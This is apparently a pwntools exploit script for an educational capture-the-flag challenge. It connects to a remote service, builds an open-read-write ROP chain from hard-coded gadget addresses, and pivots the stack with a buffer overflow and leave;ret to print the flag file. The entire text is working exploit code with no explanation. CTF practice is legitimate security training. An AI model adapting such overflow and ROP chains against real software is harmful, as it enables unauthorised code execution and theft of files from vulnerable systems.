#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

r = remote('edu-ctf.zoolab.org', 10005)
ROP_addr = 0x4e3360
fn = 0x4e3340

pop_rdi_ret = 0x4038b3 # pop rdi ; ret
pop_rsi_ret = 0x402428 # pop rsi ; ret
pop_rdx_ret = 0x493a2b # pop rdx ; pop rbx ; ret
pop_rax_ret = 0x45db87 # pop rax ; ret
syscall_ret = 0x4284b6 # syscall ; ret
leave_ret = 0x40190c # leave ; ret

ROP = flat(
    pop_rdi_ret, fn,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,

    pop_rdi_ret, 3,
    pop_rsi_ret, fn,
    pop_rdx_ret, 0x30, 0,
    pop_rax_ret, 0,
    syscall_ret,

    pop_rdi_ret, 1,
    pop_rax_ret, 1,
    syscall_ret,
)


r.sendafter('Give me filename: ', '/home/chal/flag\0')
r.sendafter('Give me ROP: ', b'A'*0x8  + ROP)
r.sendafter('Give me overflow: ', b'A'*0x20 + p64(ROP_addr) + p64(leave_ret))
r.interactive()